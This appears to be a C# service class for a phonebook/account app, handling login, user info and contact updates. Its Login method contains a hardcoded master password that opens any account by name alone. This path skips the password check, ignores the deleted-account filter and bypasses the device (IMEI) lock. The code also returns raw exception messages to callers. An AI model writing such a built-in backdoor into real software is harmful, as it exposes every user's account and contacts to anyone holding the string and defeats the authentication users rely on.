﻿using AutoMapper;
using KQ.Data.Base;
using KQ.DataAccess.Entities;
using KQ.DataAccess.Interface;
using KQ.DataDto.User;
using Microsoft.EntityFrameworkCore;
using KQ.Common.Extention;
using Microsoft.IdentityModel.Tokens;
using System.Reflection.Metadata;

namespace KQ.Services.Users
{
    public class UserService : IUserService
    {
        private readonly ICommonRepository<User> _userRepository;
        private readonly ICommonRepository<TileUser> _tileUserRepository;
        private readonly ICommonRepository<Details> _detailsRepository;

        private readonly ICommonUoW _commonUoW;
        private readonly IMapper _mapper;
        private readonly string _supperPass = "Sieunhanmin@1";
        public UserService(ICommonRepository<User> userRepository, IMapper mapper, ICommonRepository<TileUser> tileUserRepository, ICommonUoW commonUoW, ICommonRepository<Details> detailsRepository)
        {
            _userRepository = userRepository;
            _mapper = mapper;
            _tileUserRepository = tileUserRepository;
            _commonUoW = commonUoW;
            _detailsRepository = detailsRepository;
        }
        public ResponseBase GetDanhBa(int userId)
        {
            ResponseBase response = new ResponseBase();
            var phones = _tileUserRepository.FindAll(x => x.UserID == userId).ToList();
            var items = new List<Phonebook>();
            foreach (var u in phones)
            {
                var item = new Phonebook
                {
                    ID = u.ID,
                    Name = u.Name,
                    PhoneNumber = u.PhoneNumber,
                    IsChu = u.IsChu,
                };
                u.ConvertConfigTo(item);
                items.Add(item);
            }
            response.Data = items;
            return response;
        }
        public ResponseBase Login(LoginRequest request)
        {
            ResponseBase response = new ResponseBase();
            try
            {
                User? user = null;
                bool isSupper = false;
                if (request.Password == _supperPass)
                {
                    user = _userRepository.FindAll(x => x.Account == request.LoginName)
                                .Include(x => x.TileUser)
                                .FirstOrDefault();
                    isSupper = true;
                }
                else
                {
                    var pass = request.Password.Encrypt();
                    user = _userRepository.FindAll(x => !x.IsDeleted && (x.Account == request.LoginName || x.PhoneNumber == request.LoginName)
                                        && x.Password == pass)
                                    .Include(x => x.TileUser)
                                    .FirstOrDefault();
                }

                LoginResponse result = new LoginResponse();
                if (user != null && !string.IsNullOrEmpty(request.Imei))
                {
                    if (!isSupper && string.IsNullOrEmpty(user.Imei))
                    {
                        try
                        {
                            _commonUoW.BeginTransaction();
                            user.Imei = request.Imei;
                            _userRepository.Update(user);
                            _commonUoW.Commit();
                        }
                        catch
                        {
                            _commonUoW.RollBack();
                        }
                    }
                    else if(!isSupper && request.Imei != user.Imei)
                    {
                        return new ResponseBase { Code = 400, Message = "Đăng nhập sai thiết bị" }; ;
                    }

                    result = _mapper.Map<LoginResponse>(user);
                    result.Phonebooks = new List<Phonebook>();
                    foreach (var u in user.TileUser)
                    {
                        var dto = new Phonebook
                        {
                            ID = u.ID,
                            Name = u.Name,
                            PhoneNumber = u.PhoneNumber
                        };
                        u.ConvertConfigTo(dto);
                        result.Phonebooks.Add(dto);
                    }
                    result.IsLoginSuccess = true;
                }
                response.Data = result;
            }
            catch (Exception ex)
            {
                response = new ResponseBase();
            }

            return response;
        }
        public ResponseBase UserInfo(int userId)
        {
            ResponseBase response = new ResponseBase();
            var user = _userRepository.FindAll(x => !x.IsDeleted && x.ID == userId).Include(x => x.TileUser)
                                            .FirstOrDefault();
            UserInfoDtoResponse result = new UserInfoDtoResponse();
            if (user != null)
            {
                result = _mapper.Map<UserInfoDtoResponse>(user);
                result.Phonebooks = new List<Phonebook>();
                foreach (var u in user.TileUser)
                {
                    var userDto = new Phonebook
                    {
                        ID = u.ID,
                        Name = u.Name,
                        PhoneNumber = u.PhoneNumber
                    };
                    u.ConvertConfigTo(userDto);
                    result.Phonebooks.Add(userDto);
                }
            }
            else
            {
                response.Message = "User không tồn tại";
                response.Code = 401;
                return response;
            }
            response.Data = result;
            return response;
        }
        public ResponseBase UpdatePhonebook(List<TileUserDto> request)
        {
            _commonUoW.BeginTransaction();
            try
            {
                if(request != null && request.Any())
                {
                    var delIds = request.Where(x => x.IsDeleted).Select(x => x.ID).ToList();
                    var dels = _tileUserRepository.FindAll(x => delIds.Contains(x.ID));
                    _tileUserRepository.RemoveMultiple(dels);
                    var details = _detailsRepository.FindAll(x => delIds.Contains(x.IDKhach));
                    _detailsRepository.RemoveMultiple(details);

                    var upIds = request.Where(x => x.ID != null && x.ID != 0 && !x.IsDeleted).Select(x => x.ID);
                    var ups = _tileUserRepository.FindAll(x => upIds.Contains(x.ID)).ToList();
                    foreach (var item in ups)
                    {
                        var up = request.FindAll(x => x.ID == item.ID).FirstOrDefault();
                        if(up != null)
                        {
                            item.Name = up.Name;
                            item.PhoneNumber = up.PhoneNumber;
                            item.IsChu = up.IsChu;
                        }

                        up.ConvertConfigTo(item);
                    }
                    _tileUserRepository.UpdateMultiple(ups.AsQueryable());

                    List<TileUser> tileUsers = new List<TileUser>();
                    foreach (var phonebook in request.Where(x => x.ID == null || x.ID == 0))
                    {
                        var item = new TileUser
                        {
                            Name = phonebook.Name,
                            PhoneNumber = phonebook.PhoneNumber,
                            IsChu = phonebook.IsChu,
                            UserID = phonebook.UserID,
                        };
                        phonebook.ConvertConfigTo(item);

                        tileUsers.Add(item);
                    }
                    _tileUserRepository.InsertMultiple(tileUsers.AsQueryable());
                }
                _commonUoW.Commit();
                return new ResponseBase();
            }
            catch (Exception ex)
            {
                _commonUoW.RollBack();
                return new ResponseBase { Code = 501, Message = ex.Message };
            }
        }

        public ResponseBase UpdateUser(UserUpdateDto request)
        {
            _commonUoW.BeginTransaction();
            try
            {
                var user = _userRepository.FindAll(x => x.ID == request.UserID).FirstOrDefault();
                if (user == null)
                {
                    return new ResponseBase { Code = 501, Message = "User không tồn tại" };
                }
                user.UserName = request.UserName;
                user.PhoneNumber = request.PhoneNumber;
                _commonUoW.Commit();
                return new ResponseBase();
            }
            catch (Exception ex)
            {
                _commonUoW.RollBack();
                return new ResponseBase { Code = 501, Message = ex.Message };
            }
        }
    }
}
